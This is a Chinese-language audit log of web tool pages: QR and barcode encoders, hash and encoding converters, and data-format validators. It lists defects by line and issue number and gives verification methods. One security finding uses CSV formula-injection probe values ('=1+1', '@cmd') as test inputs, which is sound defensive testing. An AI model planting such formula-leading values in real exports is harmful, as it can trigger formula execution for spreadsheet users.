| `tools/it/qrcode.html` | 是（模式分段+RS+掩码+格式信息，复用 `js/qrcode.js`） | 否 | 是（格式信息 BCH + RS 码字） | 是（L/M/Q/H Reed-Solomon） | 是 | **唯一真 QR 编码页**；`:428-435` 调库；表 L 列 v9/v10 错（IT-D02）、默认 Byte 模式（IT-D03）、容量图超限仍标 10（IT-N260） |
| `tools/it/text-qr.html` | 否 | 是 | 无 | 无 | 否 | `:247-267` 固定 29×29，`text` 只作随机种子（IT-N550 高） |
| `tools/it/qr-decoder.html` | 不适用（不做图像解码） | 否 | 不适用 | 不适用 | 不适用 | `:266-345` 是按前缀解析文本的真实逻辑，不是二维码解码器；`:149`/`:152` 英文与公式误称「图像/摄像头解码」（IT-D06） |
| `tools/it/barcode-code128.html` | 是（107 符号+Start A/B/C+13 模块 Stop） | 否 | 是（加权 mod 103） | 无（一维码规范无纠错） | 是（静区偏窄） | 唯一直接复用 `js/barcode-lib.js:22-98` 的 1D 页；静区单位错位（IT-D08） |
| `tools/it/barcode-ean.html` | 部分（95 模块、保护线/奇偶表齐全） | 否 | 是（mod 10，`:250-253`） | 无 | 否（首位≠0） | `:246` G 表由 L 表反转，实为标准 G 的反码；`:273` 用于左侧 → 默认码奇偶校验失败（IT-D01 高） |
| `tools/it/barcode-upc.html` | 是（95 模块 L/R、保护线） | 否 | 是（mod 10；12 位输入核对校验位） | 无 | 是（静区仅 3.3 模块） | `:241-273` 编码结构正确，空/非数字/位数/校验位均已校验，首位已印于左静区；静区宽度仍偏窄（IT-D08） |

**核心差异**：QR 族 5 页里**只有 `qrcode.html` 一页做了真实现**——`email-qr`/`location-qr`/`text-qr` 三页全是「定位符 + 伪随机点阵」，`qr-decoder` 只是文本前缀解析器。一维族 5 页里**只有 `code128` 直接复用共享库**；`upc` 手写但结构正确，`ean` 手写且 G 表反相（默认不可扫），`code39`/`msi` 手写且不符合规范。
**重写线**：`email-qr`、`location-qr`、`text-qr` 改用 `js/qrcode.js`（按 byte/UTF-8 写入并保留 4 模块静区）。
**修复线**：`barcode-ean` → `B.encode('ean13')`；`barcode-code39` → `B.encode('code39')`；`barcode-msi` 重写位宽并补校验位；`qr-decoder` 要么补图像解码，要么删除 `:149`/`:152-157` 的图像解码宣称。

### 逐页结论

- `qrcode.html`：真编码。除 IT-N260（超 V10 一律标 10）外，本批新增两处：数字容量表 L 列 v9/v10 取值错（IT-D02），以及未指定编码模式导致纯数字也走 Byte（IT-D03）。IT-N258 的 UTF-8 问题已由 `:430-432` 修复（`stringToBytes` 已切 UTF-8），可销案。
- `text-qr.html`：假二维码；版本固定 29，`text` 只影响噪点种子（IT-N550）。
- `qr-decoder.html`：前缀解析逻辑真实（WIFI/mailto/tel/sms/geo/http/vCard/VEVENT），但不是图像解码器；WiFi 百分号解码用 `unescape`（IT-D04）、不识别 `SMSTO:`（IT-D05）、英文/公式误称图像解码（IT-D06）、NaN 守卫误吞结果（IT-D07）。
- `barcode-code128.html`：编码表/校验/Stop 均正确，是 1D 族唯一直接复用共享库的页；静区按像素计（IT-D08）仍在，空输入回退空格（IT-N125）已修。
- `barcode-ean.html`：长度与校验位校验已补齐（IT-N73/N84 的旧证据已失效，勿按旧结论返工），但 G 表反相使默认 `6901234567892` 与所有首位 1–9 的码不可扫（IT-D01）。共享库 `js/barcode-lib.js:103-104` 的 EAN_G 是正确的，本页却未加载该库。
- `barcode-upc.html`：L/R 与保护线正确，默认 `03600029145` 自动补校验位 `2`，结构合法；12 位校验位核对（IT-N128）、空/短输入拒绝（IT-N127）、首位单印左静区（IT-N129）均已修复；本地 `buildUPC` 与共享库重复仍为留存建议。

### 三角度抽查

- **默认值**：EAN 默认 `690123456789` → 校验位 2、首位 6（奇偶 `LGGGLL`），左侧 3 位走错误 G 表 → 默认输出即不可扫（IT-D01）。UPC 默认 `03600029145` → `036000291452` 校验位正确。Code128 默认 `ABC-1234` 合法。Code39 默认 `CODE-39` 字符合法但 15 元素表使图不可扫。MSI 默认 `1234567` 无校验（页面标为可选）。
- **倍率/单位**：Code39 固定 3:1（规范 2:1–3:1，合规）；MSI `1` 编成 3 模块宽条（与公式「宽条窄空」不符）；条码模块宽 2–3 px 合理；QR 真页按 `pixelSize/moduleCount` 取整（`:439-465`），伪页固定 8 px/格。静区问题见 IT-D08。
- **表维度**：`QR_NUM_CAP` 仅 L 列 v9/v10 两格错（M/Q/H 与字节容量列逐项对 ISO 表正确）；EAN `PARITY` 表、UPC `L/R` 表、MSI 数字 4 bit 表维度均正确，错的是 EAN 的 G 表内容与 Code39 的 15 元素表结构。

### 问题表格

| 页面 | 问题（tools/it/<slug>.html:NN） | 编号 |
|---|---|---|
| `tools/it/barcode-ean.html` | G 码表由 L 表逐位反转（`:246`），得到的是标准 G 的反码；`:273` 将其用于左侧第 2–7 位。默认 `6901234567892` 首位 6 → 奇偶 `LGGGLL`，第 3–5 位走错误 G，扫码器无法通过奇偶校验；只有首位 0（`LLLLLL`）不受影响。共享库 `js/barcode-lib.js:103-104` 的 EAN_G 正确，但本页未加载（`tools/it/` 下仅 `barcode-code128.html:28` 引 barcode-lib；另两处为 `tools/biz/barcode-generator.html` 与 `tools/science/barcode-pharmacode.html`）。 | IT-D01 |
| `tools/it/qrcode.html` | `QR_NUM_CAP.L` 第 9/10 项写成 511/604（`:530`），ISO/IEC 18004 数字模式 L 应为 552/652（v9 数据码字 232、v10 274）；同表 M/Q/H 与 L/M/Q/H 字节列逐项正确，仅 L 列这两格错位，容量速查表给错数。 | IT-D02 |
| `tools/it/qrcode.html` | `qr.addData(text)` 未传 mode（`:434`），`js/qrcode.js:388` 默认 `Byte`；公式 `:196` 却称「自动选最短」。20 位纯数字按 Byte 需 V2-L（32 字节），按数字模式 V1-L（41 位）即可；大写字母数字同理，版本/模块数被不必要抬高。 | IT-D03 |
| `tools/it/qr-decoder.html` | `wifiValue`（`:265`）用 `unescape` 解百分号：`unescape('%E4%B8%AD')` 得 `ä¸­`（Latin-1 逐字节），不是 UTF-8 的「中」；中文 SSID/密码显示乱码，用户照抄连不上。应改 `decodeURIComponent`。 | IT-D04 |
| `tools/it/qr-decoder.html` | 只匹配 `^sms:`（`:285`），而本站 `qrcode.html:217` 预设与 `sms-qr.html:156` 均输出 `SMSTO:号码:内容`；自家生成的短信二维码粘回来被判为「纯文本」，号码/正文都不提取。 | IT-D05 |
| `tools/it/qr-decoder.html` | `:149` 英文与 `:152` 公式写「Decode QR codes from an image or camera」「从图片中识别并解码二维码」，`:154-157` 还列出定位/采样/RS 纠错；实际控件只有文本框（`:163`），`decode()` `:266-345` 仅按前缀解析，无文件/相机/图像处理，英文态按说明使用必然扑空。 | IT-D06 |
| `tools/it/qr-decoder.html` | `:342` 的模板 NaN 守卫扫描 `decode()` 返回的、已拼入用户值的 HTML；正文/URL 含独立 `NaN` 或 `Infinity`（如 `mailto:...&body=NaN`、`WIFI:S:NaN;...`）即被替换成「⚠ 计算结果含无效值，请检查输入是否为有效正数」，解析结果整块消失。与第230批已修的短信页 NaN 守卫同型；`email-qr.html:293`、`text-qr.html:280` 同样中招。 | IT-D07 |
| `tools/it/barcode-code128.html` | 静区单位错位：`:272` 传 `quiet:10`，`js/barcode-lib.js:343` 定义了却从未使用的 `quietModules()`，`:349-351` 把 `quiet` 当像素加在 `bits.length*scale` 两侧；`scale=2` 时仅 5 模块，低于 Code 128 规范 10 模块。同型：EAN/UPC 页 10px≈3.3 模块（规范 9–11），打印/贴标时四周留白不足；SVG 路径同样按 `q*2` 处理。 | IT-D08 |

**统计**
- 页数：10（QR 族 5 + 条码族 5）。
- 新增问题：8 条——高 1（IT-D01）/ 中 7（IT-D02–IT-D08）；编号区间 IT-D01–IT-D08，连续、无重号，与既有 IT-N 系列不混号。
- 复核既有：伪实现 3 页（IT-N520/N521/N550，高）；Code39 IT-N507–IT-N509；MSI IT-N510–IT-N512；qrcode IT-N260。另确认 IT-N258（UTF-8 编码）、IT-N73/N84（长度/校验位校验）、UPC IT-N127–IT-N129 与 Code128 IT-N125 均已修复销账，勿按旧结论返工。
- 假工具：3 个（`email-qr`、`location-qr`、`text-qr`），均沿用既有高优编号，不重复计数。
- 安全条目：0 条——10 页无 `eval`/`new Function`/`allow-same-origin`/明文存密/第三方外传；用户文本均经 `escapeHtml`（`qr-decoder.html:249`、`email-qr.html:293`、`text-qr.html:280`、`barcode-msi.html:286`、`barcode-code39.html:323`），仅存主题/表单偏好于 localStorage（无敏感值）。`qrcode.html:473` 把 `e.message` 直接写入 innerHTML，但库异常文案为静态常量，不可控，未计入。
- 方法：逐页通读 HTML 与全部内联 JS；`node -e` 验证 EAN G 表为标准 G 的反码（`reverse(L)` vs `EAN_G`）、Code39 `0` 为 15 元素/25 模块（标准 9/15）、`unescape('%E4%B8%AD')` 为 `ä¸­`、Code128 表 107 项且 Stop 13 模块；未开浏览器、未跑构建/门禁、未执行 git、未修改任何 `tools/**` 或构建产物。

## AB 批 · IT 族矩阵：哈希/加密/编码（2026-11-04）

> 页面名后的「（死键 N）」= 该页第三层英文词典（`i18n/tools/en/<ind>/<slug>.json`）高优先死键数（来源 `plan/i18n-dead-keys.md`）；各线改本页时顺手清理，本批不修英文。

本轮只读复扫 `tools/it/` 下 md5/sha/base64/base32/hex/rc4 6 页，覆盖摘要、编码、流密码三个子类。默认态：md5/sha/base64/hex/base32 五页加载即自动计算，逐一对标准工具复算均正确；rc4 不自动运行，无默认输出。

### 矩阵

| 页面 | 实现方式（共享库/自写/伪/回显） | 可验证性（标准工具复算） | 结论 |
|---|---|---|---|
| `md5.html`（死键 5） | 自写 MD5（charCode 分块；文件走 FileReader 整包） | ✅ 全部一致：`node:crypto` 复算默认 `Hello, MD5!`=`383e139e64e5f46de9d03ba3695da2d8`、`abc`=`900150983cd24fb0d6963f7d28e17f72`、空串=`d41d8cd98f00b204e9800998ecf8427e`；页面 `hmacMd5('mysecret','Hello, HMAC-MD5!')`=`f8d020bdc5de08ea93f68ad045c6d01c`，80 字节长密钥亦与 `createHmac` 一致 | 算法正确，默认文本/HMAC 输出正确；仅「任意大小文件」承诺未兑现（②） |
| `sha.html`（死键 0） | 共享原生 `crypto.subtle.digest` | ✅ 一致：SHA-256(`Hello, SHA!`)=`be54d2492206f27aed3e7f822d24bd5f4f477177b712bed37c762bbad3bd2d25`，`abc`=`ba7816…0015ad`（node） | 计算正确；但承诺的 SHA-224 与「分块计算」均未实现（②） |
| `base64-converter.html`（死键 0） | 自写 Base64（TextEncoder+btoa）、Base32、Base85 | ✅ 一致：默认 `Hello, World! 你好，世界！`→`SGVsbG8sIFdvcmxkISDkvaDlpb3vvIzkuJbnlYzvvIE=`；Base32 `Hello`→`JBSWY3DP`；Base85 去掉 `<~ ~>` 包裹后与 Python `a85encode` 逐字节一致（`Hi`→`88/`，`中文`→`jLD>SQA5`），标准解码器可互通 | 三种编码正确，默认自动编码结果正确 |
| `hex-encode.html`（死键 0） | 自写 TextEncoder + `toString(16)` | ✅ 一致：默认 `Hi`→`0x4869`；`中文`→`e4b8ade69687`（node） | 编码与默认输出正确；解码不接受逐字节 0x 前缀 |
| `rc4.html`（死键 0） | 自写 RC4 KSA/PRGA + drop | ✅ 一致：独立参考实现比对 `mysecretkey`、`secret123`、`anotherkey`、`rc4test`，drop 0/768/2048、中文与空串共 7 例全等 | 算法正确；页面不自动运行；解密输入判定有实质缺陷 |
| `base32-encode.html`（死键 0） | 自写 5 位位流编码 | ✅ 一致：`Hello`→`JBSWY3DP`、`f`→`MY======`、`中文`→`4S4K3ZUWQ4======`（RFC 4648 参考实现） | 编码与默认输出正确；解码静默接受非法长度 |

### 逐页结论

- `md5.html`：MD5 主循环与 HMAC（含 >64 字节密钥取原始摘要）均与 node 一致，`md5Bytes` 走字节数组亦正确；唯一问题是文件模式把整份文件读入 `ArrayBuffer`（`:439-448`）却宣称「支持任意大小文件」（`:202`），大文件存在内存失败风险。
- `sha.html`：真正调用 WebCrypto，SHA-256 默认结果与 node 一致，无伪实现；但 SEO 正文/SoftwareApplication JSON-LD 与算法说明均宣称 SHA-224（`:54,172,481`）而选择器只有 SHA-1/256/384/512（`:189-192`），文件区宣称「分块计算」（`:224`）实际是 `file.arrayBuffer()` 整包读取（`:369`）。
- `base64-converter.html`：Base64/Base32/Base85 三套编解码均正确，Base32 解码还带剩余位非零校验；Base85 末组用 0 填充（与 Python `a85encode` 相同，非 Adobe 的 `u` 填充），两种解码器均可正确还原。`autoDetect` 勾选实际只在解码时剥离 `data:` 前缀（`:682-684`），并无「输入类型自动检测」。
- `hex-encode.html`：UTF-8→字节→两位 hex 正确，默认 `0x4869` 正确；`dec()` 只剥离行首一个 `0x`（`:290`），粘贴常见 `0x41 0x42` 会被判非法字符而非解码。
- `rc4.html`：KSA/PRGA 与 drop-N 实现与独立参考逐字节一致；但解密用 `/^[0-9a-fA-F\s]+$/` 先判 Hex（`:383-387`），把恰为纯十六进制字符的 Base64 密文误当 Hex——实测明文 `328`、默认密钥加密得 Base64 `2eFA`，再解密输出乱码而非 `328`。另 `TextDecoder(..., {fatal:false})` 永不抛错，`:401-403` 的 Hex 回退是死代码，错误密钥/二进制密文只显示 U+FFFD 替换字符。
- `base32-encode.html`：编码位流正确，默认 `Hello`→`JBSWY3DP`；`base32ToBytes`（`:271-285`）既不校验末组剩余位，也不校验长度，`JB`→`H`、`JBSWY3D`→`Hell` 均静默返回截断结果（同站 `base64-converter.html:481-482` 的 Base32 解码反而有该校验）。

### 问题表格

| 页面 | 问题（tools/it/<slug>.html:NN） | 编号 |
|---|---|---|
| `tools/it/base32-encode.html` | 解码缺剩余位/长度校验（`:271-285`）：`JB`→`H`（剩 2 位被丢）、`JBSWY3D`→`Hell`（剩 3 位被丢），非法或截断输入静默产出错值，不报错。 | IT-D09 |
| `tools/it/rc4.html` | 解密先按 Hex 判定（`:383-387`）：全 hex 字符的 Base64 密文被误解析；实测明文 `328`、key `mysecretkey` 加密得 `2eFA`，解密时被当作 hex 字节 `2E FA` 处理，输出乱码而非 `328`，加解密往返不闭合。 | IT-D10 |
| `tools/it/rc4.html` | `TextDecoder('utf-8',{fatal:false})`（`:399-403`）不会抛异常，`catch` 的 `bytesToHex` 回退为死代码；错误密钥或二进制密文输出 U+FFFD 替换串，用户无法得到原始 hex。 | IT-D11 |
| `tools/it/hex-encode.html` | 解码仅 `replace(/^0x/i,'')` 一次（`:290`），而说明称「自动忽略 0x 前缀」（`:190`）；`0x41 0x42` 清洗后成 `410x42` 被判非法字符，常见逐字节 0x 格式不可用。 | IT-D12 |
| `tools/it/sha.html` | 承诺 SHA-224 但未提供：正文与 JSON-LD 列 SHA1/SHA224/SHA256/SHA384/SHA512（`:54,172,481`），算法选择器仅 4 项、无 SHA-224（`:189-192`）。 | IT-D13 |
| `tools/it/sha.html` | 文件区称「支持大文件，分块计算」（`:224`），实现为 `await file.arrayBuffer()` 整包读取（`:369`），并未分块流式处理。 | IT-D14 |
| `tools/it/md5.html` | 文件区称「支持任意大小文件」（`:202`），实现 `reader.readAsArrayBuffer(file)` 一次性读入内存（`:439-448`），超大文件易失败且无分块。 | IT-D15 |
| `tools/it/base64-converter.html` | 「自动检测输入类型」勾选框（`:208`）实际只在解码时剥离 data URI 前缀（`:682-684`），不判断编码/解码方向，也不识别 Base32/85，标签超出实现。 | IT-D16 |
| `tools/it/rc4.html` | 安全（明文存密）：TBKit 历史把 `key`、`input`、密文一并写入 localStorage（快照 `:452-462`、`record` `:537-541`）；`md5.html` 的 `hmacKey` 同型（`:477-482,561-563`），密钥长期明文留存。 | IT-D17 |
| `tools/it/base64-converter.html` | 安全（明文留存）：加载即 `encodeText()`（`:968-970`）并 `addHistory`（`:601-614`），未操作也会把输入/输出前 200 字写入 localStorage；粘贴令牌/密钥会被持久化，界面无提示。 | IT-D18 |

**统计**

- 页数：6（摘要 2 + 编码 3 + 流密码 1）；默认自动计算 5 页，rc4 无默认输出。
- 新增问题：10 条——① 高优 4（IT-D09–IT-D12）/ ② 假工具增量 4（IT-D13–IT-D16）/ ③ 安全 2（IT-D17–IT-D18）；编号 IT-D09–IT-D18 连续、无重号，接续上批 IT-D08。
- 复核既有：未发现本族 6 页存在伪实现或回显页；md5/sha 摘要与 rc4 密码学核心均经独立实现复算一致，`base64` 页 Base32/Base85 亦经 RFC 4648 / Python `a85` 交叉验证。
- 安全：无 `eval`/`new Function`/`allow-same-origin`/可控 DOM 注入；用户文本均走 `textContent`、`escHtml` 或定长 hex 输出。模板级 `lf1-cdn-tos.bytegoofy.com/ttzz` 第三方脚本在本批 6 页均存在（如 `md5.html:122`、`rc4.html:114`），属全站通用问题，已在既有审计（本文件 `:2180`）登记，不重复计数。
- 方法：`node:crypto` 复算 MD5/SHA-256/HMAC；`vm` 提取 `md5.html` 原脚本执行（含 UTF-8、中文、长密钥）；自写独立 RC4 参考与页面实现逐字节比对（含 drop 768/2048）；Python `base64.a85encode` 校验 Base85 末组填充；未开浏览器、未跑 `_build.py`/门禁、未执行 git、未修改 `tools/**`、js/css/json 或构建产物。

## AB 批 · IT 族矩阵：文本/数据格式（2026-11-04）
> 页面名后的「（死键 N）」= 该页第三层英文词典（`i18n/tools/en/<ind>/<slug>.json`）高优先死键数（来源 `plan/i18n-dead-keys.md`）；各线改本页时顺手清理，本批不修英文。

本轮只读复扫 `tools/it/` 下 `json-formatter` / `yaml-validator` / `xml-validator` / `json-to-csv` / `text-diff` / `markdown-lint` 共 6 页，覆盖 JSON 格式化压缩、YAML、XML、CSV↔JSON、文本 diff、Markdown lint（避开已转修复的 json-path / rich-text-editor / code-runner）。默认态：5 页加载即自动出结果（`json-formatter:727` loadSample、`yaml-validator:733-738` 初始化即 validateNow、`xml-validator:281` calcTool、`json-to-csv:410` Boot 内 toCSV、`markdown-lint:241` calcTool），`text-diff` 无默认输出（`:666` 提示先点「开始对比」）。默认结果抽验：json 样例合法并渲染树/统计；YAML `SAMPLE_YAML` 验证通过；XML 默认 4 元素、根 `note` 通过；CSV 默认 2 行×3 列；Markdown 默认 2 条（缺空格列表 + 空链接）。

### 矩阵

| 页面 | 实现方式（自写解析/库/正则伪解析/回显） | 可验证性（注释/根元素/CDATA/转义/深层嵌套是否保真） | 结论 |
|---|---|---|---|
| `json-formatter.html`（死键 4） | 原生 `JSON.parse` / `JSON.stringify` + 自写递归树渲染；无第三方库 | 美化/压缩/排序/反转义结构往返等价（`{"a":1,"b":"x\"y"}`、3 层嵌套、中文与 ASCII 均等）；缩进 2/4/Tab/0 生效；「转义」对合法 JSON 与「压缩」输出逐字节相同，不生成转义串；「提取」对同段两个对象只返回第一个 | 解析真实、无伪实现；转义名不符实、提取不完整（②） |
| `yaml-validator.html`（死键 0） | `js-yaml@4.1.0`（jsdelivr CDN，SRI 锁版）`loadAll` | ✅ 多键嵌套、多文档 `---`、锚点/合并键 `<<`、literal/folded 多行块标量、Tab 缩进报错、重复键报错位置准确；⚠ 非字符串键 `2024-01-01:` 被序列化成**本地时区 Date 字符串**作 JSON 键（随 TZ 漂移），`!!binary` 输出 `{"0":104,…}` 索引对象；循环锚点被 `stringify` 捕获并提示 | 解析真实；YAML→JSON 键名/类型失真（①）；CDN 依赖弱网误报见备注 |
| `xml-validator.html`（死键 0） | 浏览器原生 `DOMParser('application/xml')` | ✅ CDATA、实体转义、200 层嵌套、注释内 `<`、中文标签、重复属性、未闭合标签、未声明命名空间前缀判定均正确；`<!DOCTYPE … SYSTEM>` 实体引用报 `undefined entity`（不取外部实体，XXE 安全）；默认样例根 `note`、4 元素通过；⚠ 合法根元素 `<parsererror>` 被判「格式错误」 | 原生解析无伪；`parsererror` 检测误判（①） |
| `json-to-csv.html`（死键 0） | 原生 `JSON.parse` + 自写 RFC 4180 引号转义 | ✅ `A, B`、`say "hi"`、单元格内换行、嵌套对象串、null/缺失键经 Python `csv` 回读为 4 行×4 列，值逐格一致；⚠ `=1+1`、`@cmd` 原样输出但导出安全路径已加单引号转义 | 序列化正确、无丢列；CSV 公式注入已由 `cellExport` 缓解（③）；IT-N6/N7 已修复（见逐页结论） |
| `text-diff.html`（死键 0） | 自写 LCS（DP 表）+ 递归回溯；字符级按 `Array.from` 码点切分 | ✅ 2000 行/2 行内差异编辑脚本可精确重建两文本（same+remove=旧、same+add=新）；⚠ 4000 行全不同文本、单行 5000 字符均抛 `RangeError: Maximum call stack size exceeded`，`doDiff` 无 try/catch 兜底 | 算法正确但规模即崩（①）；忽略空白/大小写仅作用于比较、显示保留原文，正确 |
| `markdown-lint.html`（死键 0） | 纯行正则伪解析（无 CommonMark/remark 解析器） | ✅ 默认样例命中 2 条；⚠ `---` 前置元数据、行首 `*斜体*` 被误报「列表符号后缺空格」；`#标题`（井号后无空格）、行尾空格、未闭合代码块、嵌套列表缩进 MD007 均无检出 | 宣称的 3 项检查未实现 + 误报/漏报（②）；另有 `:120` 畸形 `</div` 备注 |

### 逐页结论

- 原记录待处理部分（未复核）：`json-to-csv.html` 历史回填仍直接调用 `downloadCSV()`。
- 留存建议（aes-encryptor）：①历史点击应回填参数并重算（原记录称当前只复制）；②增加密文/明文文件下载与原文件名还原；③内置 FIPS-197 官方向量一键自检。
- 留存建议（rsa）：①提供生成密钥后一键跑通加密/解密/签名/验签的演示流程；②显示密钥指纹与位数，支持粘贴 PEM 自动识别 PKCS#1/PKCS#8；③提供与 OpenSSL 命令互操作的说明与示例。

- `json-formatter.html`：JSON 解析与格式化真实，`sortKeys` 递归按键排序且数组元素同步排序，`renderTree` 对键/值一律 `escapeHtml`，无注入面。但「转义」按钮（`:612-623`）对合法 JSON 走 `JSON.parse`→`JSON.stringify(obj)`，与「压缩」（`:561-571`）输出完全相同，只有输入不是 JSON 时才 `JSON.stringify(string)`；「反转义」期望的是 JSON 字符串字面量，因此「转义→反转义」对合法 JSON 只相当于压缩再美化，按钮语义不成立。「提取」（`:640-678`）用贪婪 `{[\s\S]*}` 从首个 `{` 取到全文最后一个 `}` 后自尾截断，日志中多个 JSON 片段只能拿到第一个，与「从日志/代码片段自动提取」的说明不符。默认态 `loadSample()`（`:727`）即渲染 2 空格美化树、类型统计与柱状图，结果正确。
- `yaml-validator.html`：核心是 js-yaml 4.1.0 `loadAll`（`:479,698`），多文档、锚点、合并键、多行块、Tab/重复键报错（含行列与上下文）均与库行为一致，2 MB 上限（`:511`）有保护，循环引用被 `stringify` 的 catch 兜住（`:574-581`）。缺陷集中在「YAML→JSON 保真」：js-yaml 会把 `2024-01-01` 解析为 `Date`，作为 mapping 键时经 JS 键强制转换成本地时区 `Date.toString()` 串（实测 `Mon Jan 01 2024 08:00:00 GMT+0800 (中国标准时间)`），换时区/语言环境键名就变；`!!binary` 为 `Uint8Array`，`JSON.stringify` 得 `{"0":104,…}` 索引对象而非 base64；正文称「遵循 YAML 1.1/1.2 规范」（`:191`），实际 js-yaml 4 为 1.2 语义（`yes/on` 输出字符串，实测），1.1 用户预期落空。备注：js-yaml 走 CDN，弱网/离线时 `ReferenceError` 被 catch 后显示成「YAML 语法验证失败：jsyaml is not defined」，与既有 G09/IT-N2 外部依赖问题同型，不另编号。
- `xml-validator.html`：直接把输入交给原生 `DOMParser`（`:266`），只以 `getElementsByTagName('parsererror')` 数量判成败（`:267-271`），再取 `documentElement.tagName` 与元素总数（`:273-275`），不输出 DOM/文本，故无往返保真问题，也不会丢数据。CDATA/转义/200 层嵌套/重复属性/未闭合标签/未声明前缀/中文标签均判定正确；`DOCTYPE SYSTEM` 的外部实体不解析（报 undefined entity），XXE 面安全。唯一实质缺陷是 `<parsererror>` 判定按限定名跨命名空间匹配：合法文档根就叫 `<parsererror>` 时会被当成解析失败（jsdom 复算为 ❌、detail 输出正文 `valid`），Chrome/Firefox 同一 DOM 接口同样命中（浏览器未实测）。默认样例（`:119`）结构正常，`calcTool()`（`:281`）加载即输出 ✅ 根 `note`、4 元素。
- `text-diff.html`：LCS DP 与回溯实现真实，行级差异再合并 remove+add 为 modify，字符级用码点切分（emoji 不拆半），全部输出走 `ToolBox.escHtml`，统计口径（modify 计 1 增 1 删、总数去重）正确；默认无自动对比。致命点是 `backtrack` 为纯递归（`:441-457`），且未做规模限制或 try/catch：实测 4000 行全不同文本、单行 5000 字符均 `RangeError`，同时 `lcsLength` 的 `m×n` 二维数组在 4000×4000 时内存压力也很大；用户对两个较大文件点「开始对比」会无结果/脚本中断。历史记录只存前 1000 字符（`:698-704`）且提供清除按钮，按既有口径不另计安全项。
- `markdown-lint.html`：实现是逐行正则（`:213-241`），仅覆盖标题跳级、标题重复（跨层级同文本也报，偏严）、`^\s*[-*]\S` 列表缺空格、空链接四类。正文 `:108` 宣称的「列表缩进是否一致」「行尾多余空格」「代码块是否标注语言」三项均无对应代码，`:151` 的公式表还标了 MD007 嵌套列表对齐。实测误报：`---` YAML 前置元数据与行首 `*斜体*` 都被判「列表符号后缺空格」；漏报：`#标题`（无空格，不渲染为标题）零提示，行尾空格、未闭合代码块、嵌套缩进全不检查——既漏又误，是名实不符的风格辅助器。另 `:120` 有一处畸形 `</div`（缺 `>`），jsdom 解析后 `.toolbar` 元素数为 0，按钮失去工具栏包裹（布局退化，非功能中断），属标记缺陷、未计入三类问题。

### 问题表格

| 页面 | 问题（tools/it/<slug>.html:NN） | 编号 |
|---|---|---|
| `tools/it/text-diff.html` | `backtrack` 纯递归无深度上限（`:441-457`），dp 为 O(m×n)；实测 4000 行全不同文本与单行 5000 字符均抛 `RangeError: Maximum call stack size exceeded`，`doDiff`（`:484-532`）无 try/catch，大文本对比直接中断、无结果。 | IT-D19 |
| `tools/it/xml-validator.html` | 以 `getElementsByTagName('parsererror')`（`:266-271`）判失败，该接口按限定名跨命名空间匹配；合法文档根为 `<parsererror>` 时被误判「格式错误」（jsdom 复算 `<parsererror><msg>valid</msg></parsererror>` → ❌、detail 为 `valid`）。 | IT-D20 |
| `tools/it/yaml-validator.html` | YAML→JSON 直接 `JSON.stringify`（`:574`）未规范化键/类型：`2024-01-01:` 键输出本地时区 `Date.toString()` 串（实测 `Mon Jan 01 2024 08:00:00 GMT+0800 (中国标准时间)`，随 TZ 变化），`!!binary` 输出 `{"0":104,…}` 索引对象；转换结果不可移植、语义丢失，页面无提示。 | IT-D21 |
| `tools/it/json-formatter.html` | 「转义」（`:612-623`）对合法 JSON 等于 `JSON.stringify(JSON.parse(x))`，与「压缩」（`:561-571`）输出逐字节相同，不产生可嵌入的转义字符串；仅非法文本走字符串转义，与「反转义」（`:625-638`）不成对，按钮名不符实。 | IT-D22 |
| `tools/it/json-formatter.html` | 「提取」贪婪匹配 `/\{[\s\S]*\}/`（`:649-667`）从首个 `{` 到全文最后一个 `}` 后自尾截断；实测 `日志: {"a":1} 后续 {"b":2}` 仅得 `{"a":1}`，同段第二个对象不可达，与「从日志/代码片段提取」不符。 | IT-D23 |
| `tools/it/markdown-lint.html` | 正文宣称检查「列表缩进一致 / 行尾多余空格 / 代码块语言标注」（`:108`，`:151` 另标 MD007），`calcTool`（`:213-241`）仅实现 4 类；实测 `---` 前置元数据与行首 `*斜体*` 误报「列表符号后缺空格」，`#标题`（井号后无空格）、行尾空格、未闭合代码块、嵌套缩进均漏报。 | IT-D24 |
| `tools/it/json-formatter.html` | 安全（明文留存）：模板持久化脚本（`:788-818`）对全部 `textarea` 绑定 input/change 写 `localStorage`（`tb_uxp_tools/it/json-formatter.html#input`），加载时静默回填；粘贴含 token/密钥的 JSON 长期明文留存，界面无提示与关闭开关。 | IT-D25 |
| `tools/it/json-to-csv.html` | 安全（CSV 注入）：`cell()` 只做引号转义（`:282-286`），不转义 `=`/`+`/`-`/`@` 起始值；实测 `=1+1`、`@cmd` 原样输出，加引号不阻止 Excel 公式解析，导出文件可被触发表格公式/外链命令。 | IT-D26 |

**统计**

- 页数：6（JSON 格式化 1 + YAML 1 + XML 1 + CSV↔JSON 1 + 文本 diff 1 + Markdown lint 1）；默认自动出结果 5 页，`text-diff` 无默认输出。
- 新增问题：8 条——① 高优 3（IT-D19–IT-D21：递归崩溃 1、XML 误判 1、YAML 转换失真 1）/ ② 假工具增量 3（IT-D22–IT-D24）/ ③ 安全 2（IT-D25–IT-D26）；编号 IT-D19–IT-D26 连续、无重号，接续上批 IT-D18。
- 伪实现排查：6 页中 4 页用原生解析或正式库（`JSON.parse` ×2、`DOMParser`、`js-yaml`），`text-diff` 为自写 LCS（真实但崩溃），`markdown-lint` 为正则伪解析且宣称项缺失；无回显式假工具。
- 安全：无 `eval`/`new Function`/`allow-same-origin`；用户文本输出均走 `textContent` / `ToolBox.escHtml`。`xml-validator` 不解析外部实体（XXE 安全），`yaml-validator` 不落盘。模板级 `lf1-cdn-tos.bytegoofy.com/ttzz` 第三方脚本本批 6 页均存在（如 `json-formatter:182`、`markdown-lint:71`），属全站通用问题、已登记，不重复计数。
- 方法：`/tmp` 用与页面同版本 `js-yaml@4.1.0` 复算多键/多文档/锚点/日期键/`!!binary`；jsdom `DOMParser` 复算 XML（CDATA/转义/200 层/`parsererror` 根/实体）；Node 原样提取 LCS+回溯与正则跑规模与误报用例；Python `csv.reader` 回读 CSV 校验引号内逗号/换行；未开浏览器、未跑 `_build.py`/门禁、未执行 git、未修改 `tools/**`、js/css/json 或构建产物。

## AC 批 · 正则族（2026-11-04）

### 族矩阵

| 页面 | 实现方式 | 可逆或可验证 | 结论 |
|---|---|---|---|
| `tools/it/regex` | 原生 RegExp：Worker 内 `new RegExp(p,f)`，替换同引擎（`:850-877`） | 同构造可验证 | 核心匹配/分组/替换正确；既有 N253/N254 仍在 |
| `tools/it/regex-cheatsheet` | 纯查表：静态 `COMMANDS` 数组 + 过滤（无执行） | 仅内容正确性 | 检索可用；JS 不支持语法已显式标注（IT-D30，第170批） |
